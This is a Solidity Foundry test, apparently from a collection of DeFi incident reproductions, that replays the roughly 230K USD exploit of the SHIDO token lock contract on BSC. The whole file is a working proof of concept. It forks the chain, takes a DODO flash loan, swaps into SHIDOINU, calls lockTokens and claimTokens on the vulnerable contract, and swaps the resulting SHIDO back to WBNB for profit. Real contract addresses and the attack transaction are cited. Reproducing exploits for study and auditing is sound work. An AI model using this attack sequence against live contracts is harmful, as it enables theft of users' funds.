// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~230K US$
// Attacker : https://bscscan.com/address/0x69810917928b80636178b1bb011c746efe61770d
// Attack Contract : https://bscscan.com/address/0xcdb3d057ca0cfdf630baf3f90e9045ddeb9ea4cc
// Vulnerable Contract : https://bscscan.com/address/0xa963ee460cf4b474c35ded8fff91c4ec011fb640
// Attack Tx : https://bscscan.com/tx/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xa963ee460cf4b474c35ded8fff91c4ec011fb640#code

// @Analysis
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1672473343734480896
// Twitter Guy : https://twitter.com/AnciliaInc/status/1672382613473083393

interface IShidoLock {
    function lockTokens() external;
    function claimTokens() external;
}

interface IFeeFreeRouter {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address payable to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract ContractTest is Test {
    IERC20 SHIDO = IERC20(0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640);
    IERC20 SHIDOINU = IERC20(0x733Af324146DCfe743515D8D77DC25140a07F9e0);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IFeeFreeRouter FeeFreeRouter = IFeeFreeRouter(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IShidoLock ShidoLock = IShidoLock(0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4);
    address dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;

    function setUp() public {
        deal(address(this), 0);
        vm.createSelectFork("bsc", 29_365_171); // It is recommended to use the quicknode endpoint
        vm.label(address(SHIDOINU), "SHIDOINU");
        vm.label(address(SHIDO), "SHIDO");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(ShidoLock), "ShidoLock");
        vm.label(address(FeeFreeRouter), "FeeFreeRouter");
        vm.label(address(Router), "Router");
        vm.label(address(dodo), "dodo");
    }

    function testExploit() public {
        DVM(dodo).flashLoan(40 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNBToSHIDOINU();
        LockAndClaimToken();
        SHIDOToWBNB();

        WBNB.transfer(dodo, baseAmount);
    }

    function WBNBToSHIDOINU() internal {
        WBNB.approve(address(Router), 100_000 * 1e18);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHIDOINU);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            39 * 1e18, 0, path, address(FeeFreeRouter), block.timestamp
        );
        WBNB.withdraw(10 * 1e15);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(10 * 1e15, 0, path, address(this), block.timestamp);
        SHIDOINU.approve(address(FeeFreeRouter), 1e27);
        FeeFreeRouter.addLiquidityETH{value: 0.01 ether}(
            address(SHIDOINU), 1e9, 1, 1, payable(address(this)), block.timestamp
        );
    }

    function LockAndClaimToken() internal {
        SHIDOINU.approve(address(ShidoLock), type(uint256).max);
        ShidoLock.lockTokens();
        ShidoLock.claimTokens();
    }

    function SHIDOToWBNB() internal {
        SHIDO.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(SHIDO);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHIDO.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
